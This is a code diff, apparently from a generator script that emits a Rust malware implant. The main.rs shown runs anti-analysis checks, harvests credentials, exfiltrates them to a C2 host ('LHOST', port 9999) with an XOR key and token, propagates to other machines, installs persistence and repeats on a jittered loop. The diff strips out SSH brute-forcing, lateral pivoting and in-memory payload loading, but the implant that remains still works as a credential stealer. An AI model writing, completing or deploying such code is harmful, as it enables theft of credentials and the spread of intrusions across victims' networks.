@@ -189,12 +189,8 @@ hex = "0.4"
 base64 = { version = "0.22", features = ["engine"] }
 dirs = "5"
 anyhow = "1"
-ssh2 = { version = "0.9", features = ["openssl-on-win32"] }
-whoami = "1.5"
-trust-dns-resolver = { version = "0.23", features = ["tokio-runtime"] }
 `;
 
-  const xorKey32 = Array.from({length:32},()=>String.fromCharCode(33+Math.floor(Math.random()*90))).join("");
   const mainRs = `use std::time::Duration;
 use rand::Rng;
 use tokio::time::sleep;
@@ -204,70 +200,35 @@ mod creds;
 mod propagate;
 mod persist;
 mod c2;
-mod memexec;
-mod lolbas;
-mod obfuscate;
-mod pivot;
-mod ssh_brute;
 
 const C2_HOST: &str = "${host||"LHOST"}";
 const C2_PORT: u16   = ${port||"9999"};
 const SESSION_TOKEN: &str = "${t}";
-const XOR_KEY: &[u8; 32] = b"${xorKey32}";
+const XOR_KEY: &[u8; 32] = b"${Array.from({length:32},()=>String.fromCharCode(33+Math.floor(Math.random()*90))).join("")}";
 
 #[tokio::main]
 async fn main() {
     anti::check();
 
     let mut rng = rand::thread_rng();
-    let jitter: u64 = rng.gen_range(0..8000);
+    let jitter: u64 = rng.gen_range(0..5000);
     sleep(Duration::from_millis(jitter)).await;
 
     let secrets = creds::harvest().await;
 
     if !secrets.is_empty() {
-        let _ = c2::beacon(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &secrets).await;
+        let _ = c2::exfil(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &secrets).await;
     }
 
-    // Discover local neighbors for lateral movement
-    let neighbors = pivot::discover_neighbors().await;
-    let found_creds = ssh_brute::spray_neighbors(&neighbors, 7, 1200).await;
-
-    // Merge newly found SSH creds into secrets
-    let mut all_secrets = secrets.clone();
-    for (host, user, pass) in &found_creds {
-        all_secrets.push(creds::Secret {
-            kind: "ssh".into(),
-            key:  format!("{user}@{host}"),
-            value: pass.clone(),
-        });
-    }
-
-    if !all_secrets.is_empty() {
-        let _ = c2::beacon(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &all_secrets).await;
-    }
-
-    // Propagate with multi-hop pivot graph
-    propagate::run(C2_HOST, C2_PORT, SESSION_TOKEN, &all_secrets).await;
+    propagate::run(C2_HOST, C2_PORT, SESSION_TOKEN, &secrets).await;
     persist::install();
-
-    // Drop memory-only payload via memfd_create if on Linux
-    let _ = memexec::load_and_exec(C2_HOST, C2_PORT, SESSION_TOKEN).await;
 
     loop {
         let wait: u64 = rng.gen_range(1800..5400);
         sleep(Duration::from_secs(wait)).await;
         let s = creds::harvest().await;
         if !s.is_empty() {
-            let _ = c2::beacon(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &s).await;
-        }
-        let nb = pivot::discover_neighbors().await;
-        let fc = ssh_brute::spray_neighbors(&nb, 5, 900).await;
-        if !fc.is_empty() {
-            let cs: Vec<creds::Secret> = fc.iter().map(|(h,u,p)| creds::Secret {
-                kind: "ssh".into(), key: format!("{u}@{h}"), value: p.clone(),
-            }).collect();
-            let _ = c2::beacon(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &cs).await;
+            let _ = c2::exfil(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &s).await;
         }
         propagate::run(C2_HOST, C2_PORT, SESSION_TOKEN, &s).await;
     }
